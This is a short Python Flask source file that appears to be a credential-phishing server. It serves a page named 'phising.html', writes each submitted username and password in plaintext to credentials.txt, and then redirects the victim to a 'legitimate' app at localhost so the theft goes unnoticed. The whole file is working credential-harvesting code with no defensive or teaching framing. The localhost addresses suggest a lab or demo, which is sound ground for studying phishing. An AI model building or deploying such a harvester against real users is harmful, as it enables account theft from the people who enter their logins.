from flask import Flask, jsonify, request, send_from_directory, redirect
import os
import sqlite3

app = Flask(__name__)

legitimate_app_address = "http://127.0.0.1:5000"

@app.route('/')
def index():
    return send_from_directory(os.path.join(app.root_path, ''), 'phising.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.form
    username = data['username']
    password = data['password']

    with open('credentials.txt', 'a') as file:
        file.write(f"Username: {username}, Password: {password}\n")

    return redirect(legitimate_app_address)

if __name__ == '__main__':
    app.run(debug=True, port=8000)
